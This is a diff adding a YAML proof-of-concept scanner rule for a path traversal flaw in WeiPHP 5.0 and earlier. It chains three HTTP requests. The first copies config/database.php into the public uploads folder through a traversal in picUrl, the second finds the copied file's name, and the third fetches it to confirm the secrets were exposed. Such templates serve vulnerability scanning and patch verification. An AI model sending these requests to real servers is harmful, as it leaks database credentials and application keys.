@@ -1,0 +1,33 @@
+name: poc-yaml-weiphp-path-traversal
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
+            body: |
+                "1":1
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /public/index.php/home/file/user_pics
+        expression: response.status == 200
+        output:
+            search: '"/public/uploads/picture/(?P<img>.+?)\"".bsubmatch(response.body)'
+            img: search["img"]
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /public/uploads/picture/{{img}}
+        expression: response.status == 200 && response.body.bcontains(b"data_auth_key") && response.body.bcontains(b"WeiPHP")
+expression: r0() && r1() && r2()
+detail:
+    author: sakura404x
+    links:
+        - http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html
+    version: Weiphp<=5.0
